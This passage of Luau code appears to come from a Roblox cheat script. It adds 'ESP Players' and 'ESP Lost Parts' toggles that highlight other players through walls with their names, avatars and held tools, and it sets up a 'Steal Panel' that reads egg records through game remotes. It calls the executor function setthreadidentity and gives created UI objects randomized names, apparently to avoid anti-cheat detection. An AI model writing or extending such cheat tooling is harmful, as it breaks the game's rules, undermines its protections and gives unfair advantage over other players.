					fn18(k)
				end

				if v17 then
					v17:Destroy()
					v17 = nil
				end
			end

			local function fn21()
				if flag4 then
					return
				end
				flag4 = true
				local n22 = 1

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n22 += deltaTime

					if n22 >= 0.3 then
						n22 = 0
						pcall(fn19)
					end
				end)
			end

			local function fn22()
				if flag6 then
					return
				end

				if tbl4.ReadToggle(v18, flag5) then
					fn21()
				elseif flag4 then
					fn20()
				end
			end

			fn4(function()
				flag6 = true
				fn20()
			end)

			v18 = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl4.SyncSoon(fn22)
				end,
			})
		end

		local TextService
		TextService = game:GetService("TextService")
		local font
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		local v16

		do
			local colorSequence = ColorSequence.new
			local tbl23 = {}
			local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local v18 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			tbl23[1] = v17
			tbl23[2] = v18

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, tbl23)
			end

			v16 = colorSequence(tbl23)
		end

		local colorSequence

		colorSequence = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
		})

		local flag4
		flag4 = false
		local n22
		n22 = 0
		local v17
		v17 = nil
		local tbl23
		tbl23 = {}
		local tbl24
		tbl24 = {}
		local tbl25
		tbl25 = {}
		local n23, tbl26, v18, flag5, flag6

		do
			local tbl27 = {}
			n23 = 0.75
			tbl26 = { Name = true, Username = false, Avatar = false, Tool = true }
			v18 = nil
			flag5 = false
			flag6 = false

			local function fn18(arg)
				local str = tostring(arg or "")
				if str:match("^%d+$") then
					return "rbxassetid://" .. str
				end
				return str
			end

			local function fn19(arg)
				if not arg or not arg:IsA("Tool") then
					return ""
				end
				local v19 = fn18(arg.TextureId)
				if v19 ~= "" then
					return v19
				end

				for _, v20 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = arg:GetAttribute(v20)
					if type(attribute) == "string" and fn18(attribute) ~= "" then
						return fn18(attribute)
					end
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						v19 = fn18(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						v19 = fn18(descendant.Image)
					end

					if v19 ~= "" then
						return v19
					end
				end

				return ""
			end

			local function fn20()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n23))
			end

			local function fn21(text, size)
				local str = text .. "@" .. size
				local v19 = tbl27[str]
				if v19 then
					return v19
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X
				local n24

				if ok then
					n24 = ok
				else
					n24 = (utf8.len(text) or #text) * size * 0.56
				end

				tbl27[str] = n24
				return n24
			end

			local function fn22(arg, color3, arg2, arg3)
				arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				arg.Color = color3
				arg.LineJoinMode = Enum.LineJoinMode.Round
				arg.Transparency = 0

				arg.Thickness = pcall(function()
					arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and arg2 or arg3
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function fn23(arg)
				local v19 = fn20()
				local visible = tbl26.Name == true or tbl26.Username == true
				local visible2 = tbl26.Avatar == true
				local visible3 = tbl26.Tool == true and arg.ToolIcon.Image ~= ""
				local n24 = visible2 and math.floor(v19 * 0.72) or 0
				local n25 = visible3 and math.floor(v19 * 0.82) or 0
				local n26 = math.floor(v19 * 0.7)
				local n27 = math.max(1, math.floor(v19 * 0.04))
				local name = tbl26.Username == true and arg.Player.Name or arg.Player.DisplayName
				arg.Name.Text = name
				arg.Shadow.Text = name
				local n28 = visible and math.floor(math.clamp(fn21(name, n26) + 4, n26, 230)) or 0
				local n29 = 0
				local n30 = 0

				if visible2 then
					n29 = 0 + n24
				end

				local n31 = 0

				if visible then
					if n29 > 0 then
						n31 = n29 + n27
					else
						n31 = n29
					end

					n29 = n31 + n28
				end

				local n32 = 0

				if visible3 then
					if not (n29 > 0) then
						n32 = n29
					else
						n32 = n29 + n27
					end

					n29 = n32 + n25
				end

				local n33 = math.max(n29, 1)
				local n34 = 1 / n33
				local n35 = 1 / v19
				arg.Billboard.Size = UDim2.fromOffset(n33, v19)
				arg.Avatar.Visible = visible2
				arg.Name.Visible = visible
				arg.Shadow.Visible = visible
				arg.ToolIcon.Visible = visible3
				arg.ToolShadow.Visible = visible3
				arg.Avatar.Position = UDim2.fromScale(n30 / n33, 0.5)
				arg.Avatar.Size = UDim2.fromScale(n24 / n33, n24 / v19)
				arg.Name.Position = UDim2.fromScale(n31 / n33, 0.5)
				arg.Name.Size = UDim2.fromScale(n28 / n33, n26 / v19)
				arg.Shadow.Position = UDim2.fromScale(n31 / n33 + n34, 0.5 + n35)
				arg.Shadow.Size = arg.Name.Size
				arg.ToolIcon.Position = UDim2.fromScale(n32 / n33, 0.5)
				arg.ToolIcon.Size = UDim2.fromScale(n25 / n33, n25 / v19)
				arg.ToolShadow.Position = UDim2.fromScale(n32 / n33 + n34, 0.5 + n35)
				arg.ToolShadow.Size = arg.ToolIcon.Size
			end

			local function fn24(arg, adornee, arg2, arg3)
				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.Adornee = adornee
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = v17
				local v19 = arg3 or arg2
				local n24 = 3.1

				if v19 ~= arg2 then
					n24 = math.clamp(arg2.Position.Y - v19.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = fn3()
				billboardGui.Adornee = v19
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n24, 0)
				billboardGui.Parent = v17
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local v20 = createImageLabel(frame, 2)
				v20.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = fn3()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = v20
				local v21 = createTextLabel(frame, 1)
				v21.TextColor3 = Color3.fromRGB(7, 19, 34)
				v21.TextTransparency = 0.05
				local v22 = createTextLabel(frame, 2)
				v22.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				fn22(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = v22
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = fn3()
				uiGradient.Color = colorSequence
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Name = fn3()
				uiGradient2.Color = v16
				uiGradient2.Rotation = 90
				uiGradient2.Parent = v22
				local v23 = createImageLabel(frame, 1)
				v23.ImageColor3 = Color3.fromRGB(0, 0, 0)
				v23.ImageTransparency = 0.35

				local tbl28 = {
					Player = arg,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = v20,
					Shadow = v21,
					Name = v22,
					ToolShadow = v23,
					ToolIcon = createImageLabel(frame, 2),
				}

				fn23(tbl28)
				return tbl28
			end

			local function fn25(arg)
				if arg.NameHumanoid and arg.NameHumanoid.Parent and arg.NameDistance ~= nil then
					pcall(function()
						arg.NameHumanoid.NameDisplayDistance = arg.NameDistance
					end)
				end

				arg.NameHumanoid = nil
				arg.NameDistance = nil
			end

			local function fn26(arg, arg2)
				local humanoid = arg2 and arg2:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end

				if arg.NameHumanoid ~= humanoid then
					fn25(arg)
					arg.NameHumanoid = humanoid
					arg.NameDistance = humanoid.NameDisplayDistance
				end

				pcall(function()
					humanoid.NameDisplayDistance = 0
				end)
			end

			local function fn27(arg)
				tbl4.DisconnectAll(arg.CharacterConnections)

				if arg.Tag then
					pcall(function()
						arg.Tag.Highlight:Destroy()
					end)

					pcall(function()
						arg.Tag.Billboard:Destroy()
					end)

					arg.Tag = nil
				end

				fn25(arg)
				arg.Character = nil
			end

			local function fn28(arg)
				if not arg.Tag or not arg.Character then
					return
				end
				local v19 = fn19(arg.Character:FindFirstChildOfClass("Tool"))
				arg.Tag.ToolIcon.Image = v19
				arg.Tag.ToolShadow.Image = v19
				fn23(arg.Tag)
			end

			local function fn29(arg, arg2, arg3)
				local image = tbl25[arg2.UserId]

				if image == nil then
					local ok

					ok, image = pcall(function()
						return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and image or ""
					tbl25[arg2.UserId] = image
				end

				if flag4 and arg.Version == arg3 and arg.Tag then
					arg.Tag.Avatar.Image = image
				end
			end

			local function fn30(arg, arg2, character)
				fn27(arg)
				arg.Version = arg.Version + 1
				local version = arg.Version
				if not flag4 or not character then
					return
				end
				arg.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not flag4 or arg.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not v17 or not v17.Parent then
						v17 = tbl4.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					arg.Tag = fn24(arg2, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					fn26(arg, character)

					local function fn31()
						task.defer(function()
							if flag4 and arg.Version == version then
								fn28(arg)
							end
						end)
					end

					table.insert(arg.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn31()
						elseif child:IsA("Humanoid") then
							fn26(arg, character)
						end
					end))

					table.insert(arg.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn31()
						end
					end))

					table.insert(arg.CharacterConnections, character.AncestryChanged:Connect(function()
						if arg.Version == version and not character:IsDescendantOf(workspace) then
							arg.Version = arg.Version + 1
							fn27(arg)
						end
					end))

					fn28(arg)
					fn29(arg, arg2, version)
				end)
			end

			local function fn31(player)
				local v19 = tbl23[player]
				if not v19 then
					return
				end
				v19.Version = v19.Version + 1
				fn27(v19)
				tbl4.DisconnectAll(v19.PlayerConnections)
				tbl23[player] = nil
			end

			local function fn32(player)
				if player == localPlayer or tbl23[player] then
					return
				end

				local tbl28 = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				tbl23[player] = tbl28

				table.insert(tbl28.PlayerConnections, player.CharacterAdded:Connect(function(character)
					fn30(tbl28, player, character)
				end))

				table.insert(tbl28.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if tbl28.Character == character then
						tbl28.Version = tbl28.Version + 1
						fn27(tbl28)
					end
				end))

				fn30(tbl28, player, player.Character)
			end

			local function fn33()
				for _, v19 in pairs(tbl23) do
					if v19.Tag then
						fn23(v19.Tag)
					end
				end
			end

			local function fn34()
				flag4 = false
				n22 += 1
				tbl4.DisconnectAll(tbl24)
				local tbl28 = {}

				for k in pairs(tbl23) do
					table.insert(tbl28, k)
				end

				for _, v19 in ipairs(tbl28) do
					fn31(v19)
				end

				if v17 then
					v17:Destroy()
					v17 = nil
				end
			end

			local function fn35()
				if flag4 then
					return
				end
				flag4 = true
				n22 += 1
				local v19 = n22
				v17 = tbl4.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					fn32(player)
				end

				table.insert(tbl24, Players.PlayerAdded:Connect(fn32))
				table.insert(tbl24, Players.PlayerRemoving:Connect(fn31))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(tbl24, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn33))
				end

				task.spawn(function()
					while true do
						if flag4 and v19 == n22 then
							task.wait(1)

							if not (not flag4 or v19 ~= n22) then
								for k, v20 in pairs(tbl23) do
									local character = k.Character
									local adornee = v20.Tag and v20.Tag.Billboard.Parent and v20.Tag.Billboard.Adornee and v20.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (v20.Character ~= character or not adornee) then
										fn30(v20, k, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function fn36()
				if flag6 then
					return
				end

				if tbl4.ReadToggle(v18, flag5) then
					fn35()
				elseif flag4 then
					fn34()
				end
			end

			fn4(function()
				flag6 = true
				fn34()
			end)

			v18 = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(arg)
					flag5 = arg == true
					tbl4.SyncSoon(fn36)
				end,
			})

			fn5(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = v18,
				Callback = function(arg)
					local tbl28 = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(arg) == "table" then
						for k, v19 in pairs(arg) do
							if type(v19) == "string" and tbl28[v19] ~= nil then
								tbl28[v19] = true
							elseif type(k) == "string" and v19 == true and tbl28[k] ~= nil then
								tbl28[k] = true
							end
						end
					end

					tbl26 = tbl28
					fn33()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v18,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n23 ~= num / 100 then
						n23 = math.clamp(num / 100, 0.5, 2)
						fn33()
					end
				end,
			})
		end

		n6 = 3
		n7 = 0.002
		n8 = 4
		tbl15 = { "Value", "Rarity", "Distance" }
		n9 = 0.3
		n10 = 0.62
		n11 = 0.86
		n12 = 5.2173913043478262
		n13 = 1.392
		n14 = 1.03
		tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService = game:GetService("TweenService")
		color2 = Color3.fromRGB

		fn14 = function(arg)
			local tbl27 = {}

			for i, v19 in ipairs(arg) do
				tbl27[i] = ColorSequenceKeypoint.new(v19[1], v19[2])
			end

			return ColorSequence.new(tbl27)
		end

		tbl16 = {}

		do
			local hud = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(0, 118, 255) }
			local tbl29 = { 1, color2(72, 204, 255) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			hud.Color = fn14(tbl27)
			hud.Rotation = -90
			hud.Stroke = color2(0, 28, 76)
			hud.Light = color2(172, 226, 255)
			tbl16.Hud = hud
		end

		do
			local steal = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(60, 255, 0) }
			local tbl29 = { 1, color2(136, 255, 0) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			steal.Color = fn14(tbl27)
			steal.Rotation = -90
			steal.Stroke = color2(11, 72, 0)
			steal.Light = color2(190, 255, 180)
			tbl16.Steal = steal
		end

		do
			local queued = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(118, 118, 132) }
			local tbl29 = { 1, color2(172, 172, 186) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			queued.Color = fn14(tbl27)
			queued.Rotation = -90
			queued.Stroke = color2(28, 28, 34)
			queued.Light = color2(214, 214, 226)
			tbl16.Queued = queued
		end

		do
			local priorityOn = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(255, 247, 0) }
			local tbl29 = { 1, color2(255, 136, 0) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			priorityOn.Color = fn14(tbl27)
			priorityOn.Rotation = 90
			priorityOn.Stroke = color2(0, 0, 0)
			priorityOn.Light = color2(132, 112, 0)
			tbl16.PriorityOn = priorityOn
		end

		do
			local cancel = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(214, 17, 17) }
			local tbl29 = { 1, color2(253, 20, 20) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			cancel.Color = fn14(tbl27)
			cancel.Rotation = -90
			cancel.Stroke = color2(72, 0, 0)
			cancel.Light = color2(255, 103, 103)
			tbl16.Cancel = cancel
		end

		do
			local chilli = {}
			local tbl27 = {}
			local tbl28 = { 0, color2(132, 74, 255) }
			local tbl29 = { 0.34, color2(178, 74, 255) }
			local tbl30 = { 0.6, color2(255, 104, 206) }
			local tbl31 = { 0.78, color2(255, 168, 232) }
			local tbl32 = { 1, color2(146, 66, 255) }
			tbl27[1] = tbl28
			tbl27[2] = tbl29
			tbl27[3] = tbl30
			tbl27[4] = tbl31
			tbl27[5] = tbl32
			chilli.Color = fn14(tbl27)
			chilli.Rotation = -115
			chilli.Stroke = color2(44, 10, 80)
			chilli.Light = color2(226, 178, 255)
			tbl16.Chilli = chilli
		end

		tbl17 = {}

		do
			local tbl27 = { 0, color2(255, 255, 255) }
			local tbl28 = { 0.2, color2(206, 212, 224) }
			local tbl29 = { 0.42, color2(74, 80, 94) }
			local tbl30 = { 0.58, color2(42, 46, 56) }
			local tbl31 = { 0.78, color2(158, 166, 182) }
			local tbl32 = { 1, color2(250, 252, 255) }
			tbl17[1] = tbl27
			tbl17[2] = tbl28
			tbl17[3] = tbl29
			tbl17[4] = tbl30
			tbl17[5] = tbl31
			tbl17[6] = tbl32
		end
	end

	local v13, v14

	do
		local v15 = fn14(tbl17)
		local tbl18 = {}
		local rarityGradients = nil

		local function fn15(arg)
			local v16 = tbl18[arg]
			if v16 then
				return v16
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag2 = type(directory) == "table" and directory[arg] or nil
			local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local str

			if rarity then
				str = tostring(rarity.DisplayName or rarity._id or "")
			else
				str = rarity
			end

			str = str or ""
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
			local color4 = fn14({ { 0, color3 }, { 1, color3 } })
			local gradientRotation

			if string.upper(str) == "SECRET" then
				gradientRotation = 90
				color4 = v15
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					color4 = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(flag2) == "table" and flag2.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local tbl19 = {}
			local name = type(flag2) == "table"

			if name then
				name = tostring(flag2.DisplayName or arg)
			end

			tbl19.Name = name or tostring(arg)
			tbl19.Icon = icon and tostring(icon) or ""

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl19.RarityNumber = rarity or 0
			tbl19.GradientColor = color4
			tbl19.GradientRotation = gradientRotation
			tbl19.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
			tbl18[arg] = tbl19
			return tbl19
		end

		local function fn16(arg, arg2)
			local n15 = tonumber(arg.AssetScale) or 1
			local n16 = n15 > 5 and (n15 / 5) ^ 1.2 * 19.637875755794113 or n15 ^ 1.85
			local mutations = type(arg.Mutations) == "table" and arg.Mutations or {}

			if #mutations == 0 and type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
				mutations = { arg.BaseMutation }
			end

			local mutations2 = tbl.Mutations
			local flag2 = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
			local n17 = 1

			if flag2 then
				local ok, result = pcall(mutations2.EarningsFor, mutations)

				if ok and type(result) == "number" then
					n17 = result
				end
			end

			return arg2.EarningRate * n16 * n17
		end

		local tbl19 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

		local function fn17(arg)
			local n15 = tonumber(arg) or 0
			local n16 = 1

			while n15 >= 1000 and n16 < #tbl19 do
				n15 /= 1000
				n16 += 1
			end

			local str = n16 == 1 and tostring(math.floor(n15)) or string.format("%.1f", math.floor(n15 * 10) / 10)
			local str2 = tbl19[n16] .. "/s"
			return "$" .. string.gsub(str, "%.0$", "") .. str2
		end

		local function fn18(arg, text)
			if arg and arg.Text ~= text then
				arg.Text = text
			end
		end

		local flag2 = false
		local n15 = 0
		local flag3 = false
		local v16 = nil
		local v17 = nil
		local v18 = nil
		local imageLabel = nil
		local v19 = nil
		local v20 = nil
		local position = nil
		local title = nil
		local v21 = nil
		local v22 = nil
		local v23 = nil
		local flag4 = false
		local v24 = v2:CreateState({ Name = "Steal Panel Open", Default = true })
		local flag5 = false
		local tween = nil
		local tween2 = nil
		local n16 = 0
		local tbl20 = nil
		local tbl21 = nil
		local n17 = 1
		local tbl22 = {}
		local tbl23 = {}
		local n18 = 1
		local tbl24 = {}
		local obj = setmetatable({}, { __mode = "k" })
		local uiStroke = nil
		local thickness = nil
		local flag6 = false
		local flag7 = false
		local flag8 = false
		local fn19 = nil

		local function fn20()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local tbl25 = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and tbl25.Eggs and tbl25.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return tbl25
		end

		local function fn21(arg)
			local ok, result = pcall(function()
				return arg:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		local function fn22(arg)
			arg.Name = fn3()

			for _, descendant in ipairs(arg:GetDescendants()) do
				descendant.Name = fn3()
			end
		end

		local n19 = 2.3120369911193848
		local n20 = 556
		local n21 = 86.24
		local tbl25 = { Panel = n19, Hud = n19 }

		local function fn23(arg)
			if arg then
				local x = v20 and v20.AbsoluteSize.X or 0
				return x > 0 and n19 * x / n20 or nil
			end
			local button = v18 and v18.Button
			button = button and button.Size.X.Offset or 0
			return button > 0 and n19 * button / n21 or nil
		end

		local function fn24(arg, arg2)
			local v25 = fn23(arg2.Panel)

			if v25 and arg.Parent then
				arg.Thickness = arg2.Ratio * v25
			end
		end

		local function fn25(arg, arg2)
			local panel = arg2 and tbl25.Panel or tbl25.Hud

			if not panel or panel <= 0 then
				panel = 2.3120369911193848
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local tbl26 = { Ratio = descendant.Thickness / panel, Panel = arg2 == true }
						obj[descendant] = tbl26
						fn24(descendant, tbl26)
					end
				end
			end
		end

		local function fn26()
			for k, v25 in pairs(obj) do
				fn24(k, v25)
			end
		end

		local function fn27()
			fn26()
		end

		local function fn28(arg)
			if not arg then
				return nil
			end

			return {
				Button = arg,
				Gradient = arg:FindFirstChildOfClass("UIGradient"),
				Stroke = arg:FindFirstChild("UIStroke"),
				Light = arg:FindFirstChild("UIStrokeClr"),
				Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
				Scale = arg:FindFirstChild("BtnScale"),
			}
		end

		local function fn29(arg, style)
			if not arg or arg.Style == style then
				return
			end
			arg.Style = style

			if arg.Gradient then
				arg.Gradient.Color = style.Color
				arg.Gradient.Rotation = style.Rotation
			end

			if arg.Stroke then
				arg.Stroke.Color = style.Stroke
			end

			if arg.Light then
				arg.Light.Color = style.Light
			end
		end

		local function fn30(arg)
			if not arg then
				return
			end
			local scale = arg.Scale

			if not scale then
				scale = Instance.new("UIScale")
				scale.Parent = arg.Button
				arg.Scale = scale
			end

			local function fn31(arg2)
				TweenService:Create(scale, tweenInfo5, { Scale = arg2 }):Play()
			end

			arg.Button.MouseEnter:Connect(function()
				fn31(1.08)
			end)

			arg.Button.MouseLeave:Connect(function()
				fn31(1)
			end)

			arg.Button.MouseButton1Down:Connect(function()
				fn31(0.94)
			end)

			arg.Button.MouseButton1Up:Connect(function()
				fn31(1.08)
			end)
		end

		local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tbl26 = {}

		local function fn31(arg)
			for _, v25 in ipairs(tbl26) do
				pcall(function()
					v25:Cancel()
				end)
			end

			table.clear(tbl26)
			if not arg then
				return
			end

			local function fn32(arg2)
				tbl26[#tbl26 + 1] = arg2
				arg2:Play()
			end

			local gradient = arg.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				fn32(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
				fn32(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
			end

			local light = arg.Light

			if light then
				light.Color = color2(226, 178, 255)
				fn32(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
			end
		end

		local v25 = setthreadidentity or set_thread_identity

		local function fn32()
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local records = nil

				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
						records = result.Records
					end
				end)

				if type(v25) == "function" then
					pcall(v25, 8)
				end

				if records then
					return records
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local flag9 = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				flag9 = true
			end)

			local now = os.clock()

			while not flag9 and os.clock() - now < n8 do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function fn33()
			return v16 ~= nil and (v16.ActivePets and v16.ActivePets.Enabled or v16.GrowingEggs and v16.GrowingEggs.Enabled) or false
		end

		local function fn34()
